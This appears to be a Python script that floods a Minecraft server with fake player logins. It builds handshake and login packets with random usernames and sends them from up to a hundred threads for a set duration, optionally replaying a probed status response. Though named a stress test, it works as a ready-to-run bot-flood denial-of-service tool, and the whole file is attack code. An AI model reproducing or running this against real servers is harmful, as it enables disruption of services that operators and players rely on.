import socket
import struct
import random
import string
import threading
import time
import json

modlist_cache = None

def pack_varint(value):
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out += struct.pack("B", byte)
        if value == 0:
            break
    return out

def send_fake_join(ip, port, use_modlist=False):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        handshake = (
            pack_varint(0x00) +
            pack_varint(758) +
            pack_varint(len(ip)) + ip.encode() +
            struct.pack(">H", port) +
            pack_varint(2)
        )
        sock.sendall(pack_varint(len(handshake)) + handshake)

        login = (
            pack_varint(0x00) +
            pack_varint(len(username)) + username.encode()
        )
        sock.sendall(pack_varint(len(login)) + login)

        if use_modlist and modlist_cache:
            for msg in modlist_cache:
                sock.sendall(msg)

        sock.recv(1024)
    except:
        pass
    finally:
        try: sock.close()
        except: pass

def run_stress(ip, port, threads=100, duration=30, use_modlist=False):
    stop_time = time.time() + duration
    def worker():
        while time.time() < stop_time:
            send_fake_join(ip, port, use_modlist=use_modlist)

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()


def probe_modlist(ip, port):
    global modlist_cache
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))

        handshake = (
            pack_varint(0x00) +
            pack_varint(758) +
            pack_varint(len(ip)) + ip.encode() +
            struct.pack(">H", port) +
            pack_varint(1)  # status
        )
        sock.sendall(pack_varint(len(handshake)) + handshake)
        sock.sendall(pack_varint(1) + pack_varint(0x00))  # Status request

        data = sock.recv(4096)
        modlist_cache = [data]
    except:
        pass
    finally:
        try: sock.close()
        except: pass
